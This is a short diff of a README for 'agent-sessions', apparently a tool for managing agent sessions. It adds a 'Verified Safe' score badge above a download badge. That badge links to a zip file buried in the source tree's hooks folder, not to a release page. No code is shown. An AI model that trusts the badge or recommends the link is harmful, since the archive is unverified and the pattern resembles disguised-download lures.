@@ -1,5 +1,7 @@
 # 🌟 agent-sessions - Manage Multiple Agent Sessions Easily
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/zenithpd-agent-sessions)
+
 [![Download agent-sessions](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip)](https://github.com/zenithpd/agent-sessions/raw/refs/heads/main/src/hooks/agent-sessions-2.6.zip)
 
 ## 📋 Overview
